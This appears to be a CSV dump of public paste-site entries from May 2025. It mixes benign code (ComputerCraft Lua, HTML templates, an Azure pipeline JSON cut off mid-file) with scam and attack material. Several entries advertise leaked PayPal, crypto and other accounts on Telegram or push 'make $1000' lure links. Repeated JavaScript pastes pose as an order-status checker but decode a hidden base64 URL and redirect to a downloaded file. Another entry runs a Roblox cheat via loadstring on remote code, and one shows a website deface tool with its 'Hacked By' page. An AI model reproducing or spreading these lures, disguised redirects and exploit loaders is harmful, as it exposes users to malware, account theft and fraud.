id,title,username,language,date,content
kLPZAxRm,PayPal with Balance,Xp_Isolation,JavaScript,Thursday 1st of May 2025 01:00:52 PM CDT,19453 Accounts Posted On https://t.me/leakzbyeminem
fKNWnCF6,Market.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 01:00:24 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72452/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hUa4wRBC,Make $1000 15-MINUTES (BEGINNER) L4,harperpestcontrol,JavaScript,Thursday 1st of May 2025 12:58:00 PM CDT," 
Pdf https://tinyurl.com/freshleaks

xmDUm1maXi
"
fNyqHdbD,BreadcrumbList - –ø—Ä–∏–º–µ—Ä –∫–æ–¥–∞,Korzunov,HTML,Thursday 1st of May 2025 12:53:39 PM CDT,"<div class=""col-md-10"">
        <ul class=""breadcrumb"" itemscope itemtype=""https://schema.org/BreadcrumbList"" >
                <li itemprop=""itemListElement"" itemscope
          itemtype=""https://schema.org/ListItem"">
                    <a itemprop=""item"" href=""/en-us/consumptionstatistic/main/"">
                        <span itemprop=""name"">Statistics</span>
                    </a>
					<meta itemprop=""position"" content=""1"" />
                </li>
                <li itemprop=""itemListElement"" itemscope
          itemtype=""https://schema.org/ListItem"" class=""active"">
                    <span itemprop=""name"">Mitsubishi Grandis 2.4 i 16V MIVEC (165 Hp) Automatic 2003-2017</span>
					<meta itemprop=""position"" content=""2"" />
                </li>

        </ul>
    </div>"
PvivJv7g,EARN $900 INSTANTLY 2025‚≠ê GV,harperpestcontrol,JavaScript,Thursday 1st of May 2025 12:48:47 PM CDT," 
Pdf https://tinyurl.com/freshleaks

rRDpNn0va5
"
kdGiTyFj,Leaked Accounts - Fresh Hits,Xp_Isolation,JavaScript,Thursday 1st of May 2025 12:45:30 PM CDT,51390 Accounts Posted On https://t.me/leakzbyeminem
AAcFeVSk,Untitled,rodrigomaise99,JavaScript,Thursday 1st of May 2025 12:44:56 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/03804/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
SDNCPaDn,Make $1000 15-MINUTES  (BEGINNER) YR,harperpestcontrol,JavaScript,Thursday 1st of May 2025 12:39:34 PM CDT," 
Pdf https://tinyurl.com/freshleaks

OReXoFkRVX
"
Y7ipWiTD,XHub Script Anti Cheat Passed,SyonDaSyip,Lua,Thursday 1st of May 2025 12:37:33 PM CDT,"loadstring(game:HttpGet(""https://raw.githubusercontent.com/ReaperSuckAsf/XhubMM2/refs/heads/main/XHubMM2""))()

-- Passed With Anti Cheat 100%üî•
-- Enjoy And Dont Forget To Like And Subscribe!!"
JFk8w2g7,EARN $900 INSTANTLY 2025 95,harperpestcontrol,JavaScript,Thursday 1st of May 2025 12:30:21 PM CDT," 
Pdf https://tinyurl.com/freshleaks

zswHJPaL3E
"
cWTvgJk4,Chaturbate with Tokens,Xp_Isolation,JavaScript,Thursday 1st of May 2025 12:30:04 PM CDT,30939 Accounts Posted On https://t.me/leakzbyeminem
9xKFVKE1,Products.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 12:29:35 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/46036/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
i0AYFDYA,üñ§ Pandora tool üñ§,RebelRose,Bash,Thursday 1st of May 2025 12:22:36 PM CDT,"üñ§The Pandora toolüñ§
2nd Page option 3 
just an idea of creating little treats beautiful build 
out there.................

Attacker Name : DeadRose
Team Name : GardenRed
Image For Script Deface : Rose
Message : the smell
Greetz : one pedal love
File Name : txt
Success make file txt
Exit..

ls -a 

cat txt.html
<head>
        <title>Hacked By DeadRose</title>
        <meta name=""viewport"" content=""width=device-width, initial-scale=1"">
        <meta charset=""utf-8"">
        <link rel=""preconnect"" href=""https://fonts.gstatic.com"">
        <link href=""https://fonts.googleapis.com/css2?family=Archivo+Black&display=swap"" rel=""stylesheet"">
        <link rel=""stylesheet"" href=""https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css"">
        <table width=""100%"" height=""90%"">
                <tbody><tr><td align=""center"">
        <br><br>
        <br><br><font color=""white"">
        <i>
        <img src=""Rose"" style=""width:300px; height:300px; border-width:0;"">
        </a><br>

        <style>
        body {
            font-family: monospace;
            font-color: white;
            background-color: grey;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #333;
        }
        </style>
        <title>DeadRose</title>

        <div class=""typewriter"">
          <h1>oh no! the security has been hacked! by DeadRose</h1><br>
          <h1>TEAM : GardenRed</h1>
        </div>
        </font>

        <b><br><font color=""white""><font size=""4"">
        Message : <br>
        the smell  <br><br>

        <hacked><br><br>
        <font size=""3"" color=""red""> Greetz:</font><br>

        [<font color=""red"">one pedal love</span></font> ]
        <body>
        <br><br>
        </audio>

        </audio>
        </body>
        </html>

        </head>
        <body>

        <body oncontextmenu=""return false"" onkeydown=""return false"" onmousedown=""return false"">
        May-01-2025 11:51 AM
    ‚ù£Ô∏èS‚Ç±¬•‚Çπ‚Å∞SI3‚ù£Ô∏è 
üíöH‚Å∞4XD3Z N√ºTZ B√ØSH3Züíö

Tool install belowüëáüëá 

apt update && apt upgrade && pkg update && pkg upgrade
   pkg install q-dns-client
pkg install curl
    pkg install wget
    pkg install python3
    pkg install git
     pkg install figlet
     git clone https://github.com/MrSanZz/pandora
     cd pandora
     pip3 install -r requirements.txt
    python3 pandora.py

python3 pandora.py

Https://facebook.com  Https://www.facebook.com facebook.com
..................................."
rYjYBPAV,Make $1000 15-MINUTES (BEGINNER) L4,harperpestcontrol,JavaScript,Thursday 1st of May 2025 12:21:08 PM CDT," 
Pdf https://tinyurl.com/freshleaks

Ybh2OwaCvG
"
gvUsJy5g,Crypto Accounts,Xp_Isolation,JavaScript,Thursday 1st of May 2025 12:14:43 PM CDT,35746 Accounts Posted On https://t.me/leakzbyeminem
5EbPHEEC,Order.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 12:14:13 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/99657/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
TyKhVhzr,Make $1000 15-MINUTES (BEGINNER) L4,lollollol50,JavaScript,Thursday 1st of May 2025 12:11:50 PM CDT," 
Pdf https://tinyurl.com/freshleaks

QgvRQCwBFf
"
tWQGrAah,ralph-hooper-v2,infamousclown_0310,HTML 5,Thursday 1st of May 2025 12:10:26 PM CDT,"<div style=""background:url(&quot;//i.postimg.cc/4dn7MStZ/fffc2880d0f425d6fc09314a70e3c57e.png&quot;);padding:15px;margin:10px 0;"" class=""img-rounded gloomy-htmls"">
  <div style=""background:#ffffff;padding:1px;text-align:justify;font-family:verdana;color:#000;font-size:17px;"">
    <div style=""border:5px solid #ffffff;padding:9px;font-size:12.3px;line-height:15px;background:#1e2d22;color:#000000;"">
      <img src=""//i.postimg.cc/wvVdpY1Z/raphbg02.png"" alt=""raphbg02.png"">
      <div style=""margin-top:-30px;text-align:right;margin-right:26px;"">
        <table>
          <tbody>
            <tr>
              <td>
                <div style=""width:501px;margin-top:37px;margin-right:7px;"">
                  <div style=""padding:4px;border:1px solid #fff;text-align:center;background:#172e21;color:#fff;"">Prole de Deimos ‚Ä¢ 31 anos ‚Ä¢ Instrutor de Criaturas Mitol√≥gicas ‚Ä¢ <b>HP:</b> 500/500 </div>
                  <div style=""padding:4px;border:1px solid #fff;background:#172e21;color:#fff;font-family:monospace;text-transform:uppercase;text-align:center;"">""Praesent maximus arcu risus, ac efficitur ex iaculis sit amet. Vestibulum quis ligula at massa tincidunt suscipit placerat a ligula.""</div>
                </div>
              </td>
              <td>
                <div style=""color:#fff;font-family:cambria;font-size:47px;line-height:35px;font-weight:bold;margin-top:34px;margin-bottom:4px;"">
                  <i> RALPH</i>
                  <br>HOOPER
                </div>
              </td>
            </tr>
          </tbody>
        </table>
      </div>
      <div style=""padding:19px;color:#000;background:#fff;font-size:13px;line-height:17px;"">
        <img src=""//64.media.tumblr.com/7df57f3c89e85c143cc4c0fa7efae14e/64e3b46be971f74e-be/s400x600/c01570bdb414188d6f566173ab6e61e104555442.gif"" style=""float:right;width:93px;margin-left:10px;border:7px solid #222d23;padding:2px;"" alt=""c01570bdb414188d6f566173ab6e61e104555442.gif"">

        <p style=""text-indent:30px;""> Lorem ipsum dolor sit amet, consectetur adipiscing elit. Phasellus convallis faucibus ullamcorper. Etiam tortor mi, accumsan vel tristique ut, posuere sed diam. Phasellus in blandit est, id ullamcorper lectus. Aliquam ut metus nec urna vulputate suscipit et sed ante. Aenean erat velit, tristique nec aliquet mattis, fermentum id ex. Nunc luctus posuere orci, ultricies porttitor felis cursus rutrum. ‚Äî <b style=""color:#2c4729;""> Orci varius natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus. </b> ‚Äî Pellentesque urna mauris, dapibus eu molestie nec, eleifend at dolor. Mauris efficitur tincidunt nunc, condimentum fermentum nulla suscipit id. Praesent maximus arcu risus, ac efficitur ex iaculis sit amet. Vestibulum quis ligula at massa tincidunt suscipit placerat a ligula. </p>
 
      </div>
    </div>
  </div>
</div>"
12kkDACE,PayPal with Balance,Xp_Isolation,JavaScript,Thursday 1st of May 2025 11:59:20 AM CDT,94087 Accounts Posted On https://t.me/leakzbyeminem
YgNr1heE,Market.js,rodrigomaise99,JavaScript,Thursday 1st of May 2025 11:58:49 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/19040/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
0aHJLYKw,FancySetupRemote,Sedrowow,Lua,Thursday 1st of May 2025 11:44:58 AM CDT,"shell.run(""pastebin get y8QVvv1v flex.lua"")
print(""Installing FlexAPI..."")
shell.run(""pastebin get JntdjJk7 receive_pocket.lua"")
print(""Installing reciever..."")
shell.run(""pastebin get 7xS0NN36 turtle_remote.lua"")
print(""Installing Remote Control..."")
sleep(2)
print(""Complete!"")"
HhmrPv0z,Leaked Accounts - Fresh Hits,Xp_Isolation,JavaScript,Thursday 1st of May 2025 11:43:58 AM CDT,82622 Accounts Posted On https://t.me/leakzbyeminem
eYdskgw7,Untitled,rodrigomaise99,JavaScript,Thursday 1st of May 2025 11:43:28 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76723/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JntdjJk7,FancyReciever_Pocket,Sedrowow,Lua,Thursday 1st of May 2025 11:41:43 AM CDT,"-- Program to receive messages from computers/
-- turtles using flex.lua ""send"" function


local log_file = ""log.txt""
local options_file = ""flex_options.cfg""
os.loadAPI(""flex.lua"")
local modem_channel = 6464

if fs.exists(options_file) then
    local file = fs.open(""flex_options.cfg"", ""r"")
    local line = file.readLine()
    while line ~= nil do
        if string.find(line, ""modem_channel="") == 1 then
            modem_channel = tonumber(string.sub(line, 15, string.len(line)))
            break
        end --if
        line = file.readLine()
    end --while
    file.close()
end --if

local modem
local p = flex.getPeripheral(""modem"")
if #p > 0 then
    modem = peripheral.wrap(p[1])
    modem.open(modem_channel)
else
    flex.printColors(""Please attach a wireless or ender modem\n"", colors.red)
    sleep(2)
    return
end --if/else

local file, line
local filelist = {}
if fs.exists(log_file) then
    file = fs.open(log_file, ""r"")
    line = file.readLine()

    while line ~= nil do
        if line ~= """" or (line == """" and filelist[#filelist] ~= """") then
            filelist[#filelist + 1] = line
        end --if

        line = file.readLine()
    end --while
    file.close()
    file = fs.open(log_file, ""a"")

else
    -- Log file does not exist: make one!
    file = fs.open(log_file, ""w"")

end --if/else

local function displayMessage(message)
local _, cursorY = term.getCursorPos()
    term.setCursorPos(1, cursorY)
    term.clearLine()
    term.setTextColor(colors.white)
    term.write(message)
end

local function scrollUp(filelist)
    local linesToScroll = #filelist - term.getSize()
    if linesToScroll > 0 then
        for i = 1, linesToScroll do
            table.remove(filelist, 1)
        end
    end
end

local function printFilelist(filelist)
    term.clear()
    for _, line in ipairs(filelist) do
        displayMessage(line)
        term.scroll(1)
    end
end

local function saveMessageToFile(message)
    file.writeLine(message)
    file.close()
end

print(""Waiting for message on channel "" .. tostring(modem_channel) .. ""..."")

while true do
    local event, modemSide, senderChannel, replyChannel, message, senderDistance =
        os.pullEvent(""modem_message"")

    saveMessageToFile(message)

    file = fs.open(log_file, ""a"")
    file.writeLine(message)
    file.close()

    displayMessage(message)

    table.insert(filelist, message)
    scrollUp(filelist)
    printFilelist(filelist)

    sleep(0.01)
end --while
"
PYPDD4hS,FancySetupMiner,Sedrowow,Lua,Thursday 1st of May 2025 11:38:19 AM CDT,"shell.run(""label set FancyMiner"")
shell.run(""pastebin get y8QVvv1v flex.lua"")
print(""Installing API..."")
shell.run(""pastebin get 5z99xPUV dig.lua"")
print(""Installing Dig...."")
shell.run(""pastebin get fQeui7VE quarry.lua"")
print(""Installing Quarry..."")
shell.run(""pastebin get 9yfBYMeU stairs.lua"")
print(""Installing Stairs..."")
sleep(2)
print(""Complete"")

"
ng0z8K51,trigger set up,takz,JSON,Thursday 1st of May 2025 11:36:43 AM CDT,"{
    ""name"": ""Copy MatterDetail to FinRep"",
    ""properties"": {
        ""activities"": [
            {
                ""name"": ""Copy MatterDetail to Blob Storage"",
                ""type"": ""Copy"",
                ""dependsOn"": [],
                ""policy"": {
                    ""timeout"": ""0.12:00:00"",
                    ""retry"": 0,
                    ""retryIntervalInSeconds"": 30,
                    ""secureOutput"": false,
                    ""secureInput"": false
                },
                ""userProperties"": [],
                ""typeProperties"": {
                    ""source"": {
                        ""type"": ""SqlDWSource"",
                        ""queryTimeout"": ""02:00:00"",
                        ""partitionOption"": ""None""
                    },
                    ""sink"": {
                        ""type"": ""SqlServerSink"",
                        ""preCopyScript"": ""TRUNCATE TABLE [FinRep].[dbo].[t_Ext]"",
                        ""writeBehavior"": ""insert"",
                        ""sqlWriterUseTableLock"": false,
                        ""tableOption"": ""autoCreate""
                    },
                    ""enableStaging"": false,
                    ""validateDataConsistency"": true,
                    ""logSettings"": {
                        ""enableCopyActivityLog"": true,
                        ""copyActivityLogSettings"": {
                            ""logLevel"": ""Warning"",
                            ""enableReliableLogging"": false
                        },
                        ""logLocationSettings"": {
                            ""linkedServiceName"": {
                                ""referenceName"": ""DataLakeStorage01"",
                                ""type"": ""LinkedServiceReference""
                            }
                        }
                    },
                    ""translator"": {
                        ""type"": ""TabularTranslator"",
                        ""mappings"": [
                            {
                                ""source"": {
                                    ""name"": ""DW_MatterDetail_ID"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""DW_MatterDetail_ID"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ServiceLine"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""ServiceLine"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FinanceServiceLine"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""FinanceServiceLine"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ServiceLineCode"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""ServiceLineCode"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""Offering"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""Offering"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MatterCategory"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""MatterCategory"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ProjectType"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""ProjectType"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BookDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                },
                                ""sink"": {
                                    ""name"": ""BookDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""EngagementLetterSignedDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                },
                                ""sink"": {
                                    ""name"": ""EngagementLetterSignedDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""CloseDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                },
                                ""sink"": {
                                    ""name"": ""CloseDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FinalIntakeCreatedDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                },
                                ""sink"": {
                                    ""name"": ""FinalIntakeCreatedDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MasterBookDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                },
                                ""sink"": {
                                    ""name"": ""MasterBookDate"",
                                    ""type"": ""DateTime"",
                                    ""physicalType"": ""datetime""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MasterBookYear"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MasterBookYear"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MasterBookQuarter"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MasterBookQuarter"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MasterBookMonth"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MasterBookMonth"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MasterBookWeek"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MasterBookWeek"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FO"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                },
                                ""sink"": {
                                    ""name"": ""FO"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""varchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MatterNumber"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""MatterNumber"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""MatterIndex"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                },
                                ""sink"": {
                                    ""name"": ""MatterIndex"",
                                    ""type"": ""Int32"",
                                    ""physicalType"": ""int""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FinanceStatus"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""FinanceStatus"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ClientName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""ClientName"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""BillingState"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""BillingState"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""ClientAccountBillingCity"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                },
                                ""sink"": {
                                    ""name"": ""ClientAccountBillingCity"",
                                    ""type"": ""String"",
                                    ""physicalType"": ""nvarchar""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""OriginalWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""OriginalWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""AdjustedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                },
                                ""sink"": {
                                    ""name"": ""AdjustedWIP"",
                                    ""type"": ""Decimal"",
                                    ""physicalType"": ""decimal"",
                                    ""scale"": 8,
                                    ""precision"": 38
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""3E_AdjWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""3E_AdjWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""PriorWeekAdjWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""PriorWeekAdjWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""3E_PriorWeekAdjWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""3E_PriorWeekAdjWIP"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""TotalAdjustedWIPTier1"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""TotalAdjustedWIPTier1"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""TotalAdjustedWIPTier2"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""TotalAdjustedWIPTier2"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""TotalAdjustedWIPTier3"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""TotalAdjustedWIPTier3"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""TotalAdjustedWIPTier4"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                },
                                ""sink"": {
                                    ""name"": ""TotalAdjustedWIPTier4"",
                                    ""type"": ""Double"",
                                    ""physicalType"": ""float""
                                }
                            },
                            {
                                ""source"": {
                                    ""name"": ""FinalCredit"",
